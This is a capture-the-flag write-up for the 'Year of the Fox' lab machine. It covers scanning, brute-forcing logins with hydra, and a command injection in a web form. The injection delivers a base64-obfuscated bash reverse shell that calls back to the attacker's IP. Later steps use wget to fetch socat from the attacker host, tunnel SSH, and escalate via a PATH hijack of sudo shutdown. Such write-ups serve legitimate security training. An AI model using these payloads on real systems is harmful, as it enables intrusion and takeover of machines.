# Year of the Fox
### Difficulty: Hard
------------------------------------------------------

Let's start with nmap scan:
```bash
nmap -sV -sC 10.10.37.83 | tee scans/first.nmap
```

Results:
```bash
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)
Service Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX

Host script results:
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: 0s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-14T08:14:40
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: year-of-the-fox
|   NetBIOS computer name: YEAR-OF-THE-FOX\x00
|   Domain name: lan
|   FQDN: year-of-the-fox.lan
|_  System time: 2023-05-14T09:14:40+01:00
```

There are 3 open ports on this machine - 80 (HTTP) and 139 & 445 (SMB), also, this is a linux machine.

I'll start with the http service:
![image](https://github.com/yuvalbatan/writeups/assets/114166939/7ea1de55-4d58-40aa-a30c-5715db5048de)


Right now I don't have enough information for this authentication, let's see what the request and response looks like with "curl" tool:
```bash
curl -I http://10.10.37.83
```

Answer:
```bash
HTTP/1.1 401 Unauthorized
Date: Sun, 14 May 2023 13:47:30 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm="You want in? Gotta guess the password!"
Content-Type: text/html; charset=iso-8859-1
```

According to this, I should brute-force the password using the username.

Let's move on to the smb service.

To investigate this service I'll use the "enum4linux" tool:
```bash
enum4linux -a 10.10.37.83
```

It found users:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/a9cf6f78-7b36-4aa8-9258-4387bddc8b9c)


One of them is supposed to be the user on the website. I'll go back to the HTTP service and use the "hydra" tool to brute force the password:

Let's start with rascal user -
```bash
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.37.83 http-get
```

Got the password!

![image](https://github.com/yuvalbatan/writeups/assets/114166939/48b05a05-1f8d-49c6-907a-814da8671998)

Let's log-in to the website:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/cc1e37a6-8db5-41bb-8ed7-c59e0d9a67f5)

I'll catch the request of the input with the "Interception" at the "Proxy" tab in Burp-Suite:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/f30ba5bd-fa5c-4008-a797-255a00b6f1cc)


Send it to the "Repeater" with "CTRL + R".

We can see that there is some interaction with the server by sending a value in the "target" key.

This request in vulnerable for command injection:

Request:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/2ae1941a-a65f-41de-b318-4a81215942e3)

Response:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/a7955499-6578-41d5-97ab-73856eb1489a)


If I can run "pwd" then I can run a reverse shell!

Not many OS commands work because of some sanitization, so I'll have to obfuscate my reverse shell command.

For starter I'll build the reverse shell command:
```bash
/bin/bash -i >& /dev/tcp/10.14.50.11/6563 0>&1
```

Next, I'll encode this command to it's base64 value:
```bash
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjUwLjExLzY1NjMgMD4mMQ==
```

Now the payload will look like:
```bash
{"target":"\";echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE0LjUwLjExLzY1NjMgMD4mMQ== | base64 -d | bash; \""}
```

I'll establish a net-cat listener on my machine:
```bash
nc -lnvp 6563
```

After sending the request, I got a shell with user "www-data"!

![image](https://github.com/yuvalbatan/writeups/assets/114166939/7d424bdc-e77f-42a5-af06-8521495157c8)

Next step is to print the first flag, "web-flag.txt", which located on "/var/www":

![image](https://github.com/yuvalbatan/writeups/assets/114166939/318c3e64-2c4b-4e88-9b89-0ad25ff55c1b)

Now, I'll print all the open ports on the machine with the command:
```bash
netstat -tln
```

Results:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/105be6c4-55cd-4015-8e1f-18ae16ec35c3)

This is quite interesting, port 22 (SSH) is open on localhost (127.0.0.1).

Let's see in its configuration directory if we can find anything interesting about this service.

I'll open "/etc/ssh", and open "sshd_config" file:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/04eb6ea8-d3ab-4ea8-bff1-57f9397ae935)

Only fox user can enter via this service.

In the case that this service is listening on localhost, even though I'm on the same network, I'm unable to connect or see it's open (nmap scan results didn't show port 22).

This is a classic case for tunneling (or port forwarding).

Because this machine has no "socat" on it, I'll download socat from "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" on my machine. Next, I'll open a python3 server at the same location as the socat file:
```bash
python3 -m http.server
```

I'll enter a folder which I can write to and execute from. Let's go to the "/tmp" folder:
```bash
cd /tmp
```

I'll download the file on the victim machine with wget command:
```bash
wget http://10.14.50.11:8000/socat
```

Give it execution permissions:
```bash
chmod +x socat
```

And run the command to tunnel 127.0.0.1:22 to the public IP of the machine on port 2423:
 ```bash
./socat TCP-LISTEN:2423,fork TCP:127.0.0.1:22
 ```

We can check if it worked by scanning the machine again with nmap. 

Looks like it worked:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/7063ebe1-0766-4148-8286-cd807947af52)


From the attacker machine I know I can use the fox user, so let's brute-force our way using hydra:
```bash
hydra -l fox -P /usr/share/wordlists/rockyou.txt ssh://10.10.37.83:2423
```

Got the password!

![image](https://github.com/yuvalbatan/writeups/assets/114166939/a71ee94c-4acb-49ad-9153-c6bd8e1db502)

Log in with the command:
```bash
ssh fox@10.10.37.83 -p 2423
```

![image](https://github.com/yuvalbatan/writeups/assets/114166939/a3240b59-69c9-4369-ad90-694971f28bd3)

To begin with, I'll find the second flag, "user-flag.txt", which is located in the fox user home directory:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/30183853-00fe-4b77-941b-cfee0881310f)

Alright, let's gather some information about this user permissions:
```bash
sudo -l
```

![image](https://github.com/yuvalbatan/writeups/assets/114166939/738477c7-7723-4412-bd0f-f218d9b7a359)


A quick search on the internet will give us the result "https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-shutdown-poweroff-privilege-escalation/", I'll use these permissions to get to the root with the commands:
```bash
echo /bin/bash > /tmp/poweroff && chmod +x /tmp/poweroff && export PATH=/tmp:$PATH && sudo /usr/sbin/shutdown
```

Got the root user!

![image](https://github.com/yuvalbatan/writeups/assets/114166939/46212b77-9ae3-41d6-9fc0-4fe4c306ddd3)


Let's get the final flag, "root.txt" from the root home directory:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/84df8284-8298-4d2a-9343-cc62169861f2)


Ok! It's not here.

Let's go to the only home directory we didn't enter or used before - the "rascal" home directory, which as root we can enter.

Here I found the real final flag which is called ".did-you-think-I-was-useless.root" which is a bit messy but correct:

![image](https://github.com/yuvalbatan/writeups/assets/114166939/5dc9e0f3-a49d-4e3d-9821-770f5ce46f2a)
